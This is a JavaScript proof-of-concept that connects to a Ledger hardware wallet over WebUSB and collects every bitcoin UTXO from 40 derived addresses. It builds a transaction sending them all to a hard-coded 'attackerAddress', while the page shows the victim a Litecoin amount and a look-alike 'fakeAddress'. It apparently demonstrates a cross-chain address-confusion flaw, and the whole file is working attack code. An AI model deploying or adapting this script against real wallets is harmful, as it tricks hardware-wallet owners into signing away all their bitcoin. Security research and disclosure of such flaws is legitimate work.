import "babel-polyfill";
import TransportWebUSB from "@ledgerhq/hw-transport-webusb";
import AppBtc from "@ledgerhq/hw-app-btc";
import {serializeTransactionOutputs } from "@ledgerhq/hw-app-btc/lib/serializeTransaction";
import * as bip32 from 'bip32'
import * as BitcoinJS from 'bitcoinjs-lib'
import { compressPubKey, getAmountBuffer } from './utils'
import axios from 'axios'
import _ from 'lodash'

// Addresses derived using same public key
const attackerAddress = 'bc1qwdyup9g7jxmt3ct27p3hexfqjv9dykfc6afdnr'
const fakeAddress = 'ltc1qwdyup9g7jxmt3ct27p3hexfqjv9dykfc7pnftn'

const basePath = `84'/0'/0'`

let app
async function getApp () {
  if (app) return app
  const transport = await TransportWebUSB.create();
  transport.setDebugMode(true);
  app = new AppBtc(transport);
  return app
}

async function getPubKeyData () {
  const app = await getApp()
  return app.getWalletPublicKey(basePath, { format: 'bech32' })
}

async function getAddresses(num, change) {
  const pubKeyData = await getPubKeyData()
  const pubKey = compressPubKey(pubKeyData.publicKey)
  const node = bip32.fromPublicKey(Buffer.from(pubKey, 'hex'), Buffer.from(pubKeyData.chainCode, 'hex'))

  const addresses = []
  for(let i = 0; i < num; i++) {
    const subPath = `${change ? '1' : '0'}/${i}`
    const path = node.derivePath(subPath)
    const address = BitcoinJS.payments.p2wpkh({pubkey: path.publicKey}).address
    addresses.push({address, derivationPath: `${basePath}/${subPath}`})
  }
  
  return addresses
}

async function getUtxos (a) {
  const result = await axios.get(`https://blockstream.info/api/address/${a.address}/utxo`)
  const utxos = result.data
  return utxos.map(utxo => ({ ...utxo, derivationPath: a.derivationPath }))
}

async function getAllUtxos (addresses) {
  const utxoSets = await Promise.all(addresses.map(a => getUtxos(a)))
  return _.flatten(utxoSets)
}

async function getTransactionHex (txHash) {
  const result = await axios.get(`https://blockstream.info/api/tx/${txHash}/hex`)
  return result.data
}

async function buildTransaction (utxos) {
  const app = await getApp()
  // build inputs:
  const inputs = await Promise.all(utxos.map(async utxo => {
    const hex = await getTransactionHex(utxo.txid)
    const tx = app.splitTransaction(hex, true)
    return [ tx, utxo.vout ]
  }))

  const derivationPaths = utxos.map(utxo => utxo.derivationPath)

  const totalValue = utxos.reduce((a, b) => a + b.value , 0)
  const fee = 1000
  const outputValue = totalValue - fee

  const outputs = [{
    amount: getAmountBuffer(outputValue),
    script: BitcoinJS.address.toOutputScript(attackerAddress)
  }]

  const serailizedTransactionOutputs = serializeTransactionOutputs({ outputs }).toString('hex')

  const send = async () => {
    return app.createPaymentTransactionNew(
      inputs,
      derivationPaths,
      undefined,
      serailizedTransactionOutputs.toString('hex'),
      undefined,
      undefined,
      true,
      undefined,
      ['bech32']
    )
  } 

  return { send, fakeAddress, outputValue }
}

document.getElementById('connect').addEventListener("click", async () => {
  try {
    const inAddresses = await getAddresses(20, false)
    const changeAddresses = await getAddresses(20, true)
    const utxos = await getAllUtxos([...inAddresses, ...changeAddresses])
    const {send, fakeAddress, outputValue } = await buildTransaction(utxos)

    document.getElementById('txinfo').style = ''
    document.getElementById('amount').innerText = `LTC ${outputValue / 1e8}`
    document.getElementById('address').innerText = fakeAddress

    document.getElementById('send').onclick = async () => {
      const rawTransaction = await send()
      document.getElementById('rawtx').innerHTML = `
    <h3>Transaction spending all of your mainnet bitcoin utxos:</h3>
    <textarea rows="20" cols="100">${rawTransaction}</textarea>`
    }
    
  } catch (e) {
    alert(e.message)
  }
});